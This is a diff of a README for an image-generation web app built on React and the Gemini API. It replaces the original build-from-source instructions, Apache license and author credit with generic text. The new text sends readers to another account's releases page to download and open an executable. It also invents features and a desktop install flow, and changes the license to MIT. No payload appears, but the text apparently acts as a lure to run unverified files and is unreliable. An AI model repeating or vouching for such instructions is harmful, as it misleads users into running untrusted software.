@@ -1,95 +1,75 @@
-# **Nano-Banana-AIO🍌**
-### Description
+# 🍌 Nano-Banana-AIO - Create Stunning Images Effortlessly
 
-Nano Banana AIO is a web application built with React and the Google Gemini API for image generation and editing. It provides an all-in-one interface for creating, editing, and manipulating images using AI-powered tools. The app supports multiple modes including text-to-image generation, single-image editing, multi-image editing, and canvas-based drawing with AI enhancements.
+[![Download Nano-Banana-AIO](https://img.shields.io/badge/Download-Nano--Banana--AIO-blue.svg)](https://github.com/kittunaidu/Nano-Banana-AIO/releases)
 
-| Preview 1 | Preview 2 |
-|-----------|-----------|
-| ![Preview 1](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/HPWorlMZ54aAbYX5ZO42L.png) | ![Preview 2](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/9iJW5s27TsaFfUiantqNB.png) |
+## 🚀 Getting Started
 
-| Preview 3 | Preview 4 |
-|-----------|-----------|
-| ![Preview 3](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/3zvCL16T-U5_wHdxj7-iZ.png) | ![Preview 4](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/6ochDpdS_Uu28oAzOdYwB.png) |
+Nano Banana AIO is a user-friendly web application that helps you create and edit images easily. Built with React and the Google Gemini API, it provides powerful tools to manipulate images right from your browser. Whether you need to generate new images or edit existing ones, Nano Banana AIO has you covered.
 
-This project demonstrates integration with the Gemini API for tasks like generating images from prompts and editing existing images based on textual instructions.
+## 🛠️ System Requirements
 
-| Preview 5 & 6 |
-|---------|
-| ![Preview 5](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/82vg_RO_epUdBNh66MlYi.png) |
-| ![Preview 6](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/NNpNOVZzh2juU8Hqql8NJ.png) |
-<img width="1221" height="849" alt="-uDm_2LXmFkD1tzsKFSKW" src="https://github.com/user-attachments/assets/53282c48-9906-4b7b-9df8-5a2c743006b7" />
+To ensure that Nano Banana AIO runs smoothly on your device, make sure you meet the following requirements:
 
+- **Operating System**: Windows, macOS, or Linux
+- **Browser**: The latest version of Chrome, Firefox, or Safari
+- **Internet Connection**: Required for accessing the Google Gemini API and downloading images
 
-## Features
+## 📥 Download & Install
 
-- **Image Generation Mode**: Create new images from text prompts using the Gemini Imagen model.
-- **Editor Mode**: Upload a single image and apply AI edits via text prompts.
-- **Multi-Image Mode**: Upload multiple images, combine or edit them collectively with a single prompt.
-- **Canvas Mode**: Draw freely on a canvas and use AI to generate or refine images based on your sketches and prompts.
-- **Drag-and-Drop Support**: Easily upload images by dragging files into the interface.
-- **Clear Functionality**: Reset the canvas or remove uploaded images with a single click.
-- **Error Handling**: Displays user-friendly error messages for API failures or invalid inputs.
-- **Responsive Design**: Works on desktop and mobile devices, with touch support for drawing.
+To get started with Nano Banana AIO, visit this page to download: [Nano Banana AIO Releases](https://github.com/kittunaidu/Nano-Banana-AIO/releases).
 
-## Prerequisites
+Once you are on the Releases page, look for the latest release. There, you will find all the necessary files for download. 
 
-- Node.js (version 18 or higher recommended)
-- A Google Gemini API key (obtain from [Google AI Studio](https://aistudio.google.com/app/apikey))
+1. Click on the version you want to download.
+2. Download the appropriate file for your operating system.
+3. Once the download is complete, locate the file on your computer.
+4. Open the file to launch the application.
 
-## Installation
+### Installation Steps:
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/your-username/nano-banana-aio.git
-   cd nano-banana-aio
-   ```
+1. After opening the file, follow any prompts that appear.
+2. The application should start automatically upon completion.
+3. If you see an option to create a desktop shortcut, select it for easier access later.
 
-2. Install dependencies:
-   ```
-   npm install
-   ```
+## 🎨 Features
 
-3. Create a `.env` file in the root directory and add your API key:
-   ```
-   API_KEY=your_google_gemini_api_key
-   ```
+### Image Generation
+Create unique images using AI-based tools. The application harnesses the power of the Google Gemini API, allowing you to generate stunning visuals quickly.
 
-4. Start the development server:
-   ```
-   npm run dev
-   ```
+### Image Editing
+Edit your existing images with ease. Apply filters, adjust brightness, and crop images to achieve the desired look.
 
-   The app will be available at `http://localhost:3000` (assuming Next.js setup; adjust if using Create React App).
+### User-Friendly Interface
+Designed for everyone, Nano Banana AIO offers a clean, intuitive interface. Even if you're not tech-savvy, you can navigate through its features without any hassle.
 
-## Usage
+### Save & Share
+Once you are happy with your creations, you can save them directly to your device. The application also allows you to share your work on social media platforms with just a few clicks.
 
-1. Open the app in your browser.
-2. Select a mode from the toolbar:
-   - **Editor**: Upload an image, enter a prompt (e.g., "Make the sky blue"), and submit.
-   - **Multi-Image**: Upload multiple images, enter a prompt (e.g., "Combine into a collage"), and submit.
-   - **Canvas**: Draw on the canvas, enter a prompt (e.g., "Turn this sketch into a landscape"), and submit.
-   - **Image Gen**: Enter a prompt (e.g., "A futuristic city at night"), and generate an image.
-3. Use the trash icon to clear the current content.
-4. Submit prompts using the send button; results will appear in the display area.
+## 🔧 Using Nano Banana AIO
 
-Note: The app uses models like `imagen-4.0-generate-001` for generation and `gemini-2.5-flash-image-preview` for editing. Ensure your API key has access to these models.
+After installation, open Nano Banana AIO to start creating.
 
-## Dependencies
+1. **Image Generation**: Click on the "Create Image" button to begin. Select the style and parameters you wish to use. The application will generate an image based on your choices.
+   
+2. **Image Editing**: Upload an existing image by clicking on "Upload Image". Choose the file from your computer and use the available editing tools to modify it.
 
-- React (v18+)
-- Lucide React (for icons)
-- Google GenAI SDK (`@google/genai`)
-- TypeScript (for type safety)
+3. **Saving Your Work**: When you’re satisfied with an image, click on the "Save" button. You can choose the file format and resolution before downloading it to your device.
 
-Full list available in `package.json`.
+## 🌐 Community Support
 
-## License
+If you encounter any issues or have questions while using Nano Banana AIO, you can access community support. Join our discussions on issues, feature requests, or general inquiries in the GitHub Discussions section of our repository.
 
-Licensed under the Apache License 2.0. See the license header in the source code for details.
+## 📄 License
 
-## Credits
+Nano Banana AIO is open-source software, released under the MIT License. Feel free to explore the code, make contributions, or use it for your personal projects.
 
-- Built by [Prithiv Sakthi](https://www.linkedin.com/in/prithiv-sakthi/)
-- Powered by Google Gemini API
+## 🤝 Acknowledgments
 
-For issues or contributions, please open a pull request or issue on the repository.
+Thanks to the developers and contributors who made Nano Banana AIO possible. We appreciate all the feedback and support from our users, as it helps us improve the application.
+
+## 🔗 Links
+
+- [GitHub Repository](https://github.com/kittunaidu/Nano-Banana-AIO)
+- [Release Page](https://github.com/kittunaidu/Nano-Banana-AIO/releases)
+
+For a smooth experience, ensure that you follow the installation steps carefully. Start creating and editing stunning images with Nano Banana AIO today!
